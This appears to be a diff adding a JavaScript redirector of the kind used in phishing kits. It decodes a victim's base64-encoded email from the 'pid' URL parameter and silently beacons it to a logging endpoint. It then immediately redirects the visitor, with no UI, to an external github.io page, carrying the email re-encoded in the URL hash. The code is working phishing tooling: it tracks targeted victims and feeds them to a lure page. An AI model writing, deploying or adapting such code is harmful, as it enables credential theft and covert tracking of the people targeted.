@@ -1,0 +1,142 @@
+<script type="text/javascript">
+function validateEmail(email) {
+    var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+    return re.test(email);
+}
+
+function decodeBase64(s) {
+    var e = {}, i, b = 0, c, x, l = 0, a, r = '', w = String.fromCharCode, L = s.length;
+    var A = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    for (i = 0; i < 64; i++) { e[A.charAt(i)] = i; }
+    for (x = 0; x < L; x++) {
+        c = e[s.charAt(x)];
+        if (c === undefined) continue;
+        b = (b << 6) + c;
+        l += 6;
+        while (l >= 8) {
+            a = (b >>> (l -= 8)) & 0xff;
+            if (a || x < (L - 2)) r += w(a);
+        }
+    }
+    return r;
+}
+
+function generateRandomString(length) {
+    var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    var result = '';
+    for (var i = 0; i < length; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return result;
+}
+
+function addRandomStringsToEmail(email) {
+    // Generate 4 different random strings
+    var randomStrings = [];
+    for (var i = 0; i < 4; i++) {
+        randomStrings.push(generateRandomString(8)); // 8 characters each
+    }
+    
+    // Join them with a separator and append to email
+    var suffix = randomStrings.join('-');
+    return email + '|' + suffix;
+}
+
+function logToConsole(message, data) {
+    try {
+        console.log("[Redirect Debug]", message, data || "");
+    } catch(e) {}
+}
+
+function getParameterByName(name, url) {
+    if (!url) url = window.location.href;
+    name = name.replace(/[\[\]]/g, "\\$&");
+    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+        results = regex.exec(url);
+    if (!results) return null;
+    if (!results[2]) return '';
+    return decodeURIComponent(results[2].replace(/\+/g, " "));
+}
+
+function processRedirect() {
+    try {
+        // Get pid from URL query parameter
+        var pid = getParameterByName('pid');
+        logToConsole("Original pid:", pid);
+
+        if (!pid) {
+            logToConsole("No pid found, skipping redirect");
+            return;
+        }
+
+        // Decode once
+        var decoded = decodeBase64(pid);
+        logToConsole("Decoded once:", decoded);
+
+        // Check if it's a valid email after first decode
+        var emailAfterFirstDecode = decoded.replace(/\$/g, '@');
+        var isDoubleEncoded = false;
+
+        // If not a valid email, try double decode
+        if (!validateEmail(emailAfterFirstDecode)) {
+            try {
+                var doubleDecoded = decodeBase64(decoded);
+                logToConsole("Double decoded raw:", doubleDecoded);
+                
+                var emailAfterDoubleDecode = doubleDecoded.replace(/\$/g, '@');
+                if (validateEmail(emailAfterDoubleDecode)) {
+                    decoded = doubleDecoded;
+                    emailAfterFirstDecode = emailAfterDoubleDecode;
+                    isDoubleEncoded = true;
+                    logToConsole("Successfully double decoded email:", emailAfterFirstDecode);
+                }
+            } catch(e) {
+                logToConsole("Double decode failed:", e);
+            }
+        }
+
+        // Final validation
+        if (!validateEmail(emailAfterFirstDecode)) {
+            logToConsole("Invalid email, stopping:", emailAfterFirstDecode);
+            return;
+        }
+
+        // Add 4 random strings to the email
+        var emailWithRandomStrings = addRandomStringsToEmail(emailAfterFirstDecode);
+        logToConsole("Email with random strings:", emailWithRandomStrings);
+
+        // Re-encode with random strings
+        var newHash = btoa(emailWithRandomStrings);
+
+        // Silent logging
+        try {
+            navigator.sendBeacon(
+                "log.php",
+                JSON.stringify({ 
+                    email: emailAfterFirstDecode,
+                    email_with_suffix: emailWithRandomStrings,
+                    original_pid: pid,
+                    double_encoded: isDoubleEncoded,
+                    timestamp: new Date().toISOString()
+                })
+            );
+        } catch (e) {}
+
+        // Redirect with the new hash
+        var redirectUrl = "https://educational-technology001.github.io/verbose-meme-visibility#" + newHash;
+        logToConsole("Redirecting to:", redirectUrl);
+
+        window.location.replace(redirectUrl);
+
+    } catch (error) {
+        console.error("Redirect error:", error);
+    }
+}
+
+// Run immediately (no delay, no UI)
+if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', processRedirect);
+} else {
+    processRedirect();
+}
+</script>
